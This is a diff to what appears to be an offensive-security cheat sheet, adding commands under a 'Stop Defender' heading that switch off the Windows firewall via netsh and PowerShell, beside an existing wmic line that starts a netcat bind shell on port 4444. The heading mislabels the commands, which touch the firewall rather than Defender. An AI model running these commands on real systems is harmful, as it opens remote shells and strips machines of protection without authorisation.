@@ -130,6 +130,19 @@ sc start ncservice2
 ```
 wmic process call create "c:\tools\nc.exe -l -p 4444 -e cmd.exe"
 ```
+
+#### Stop Defender   
+
+CMD   
+```
+netsh advfirewall set allprofiles state off
+```   
+Powershell   
+```
+Set-NetFirewallProfile -Enabled False
+```   
+
+
 # Chapter 4
 
 #### Hydra 
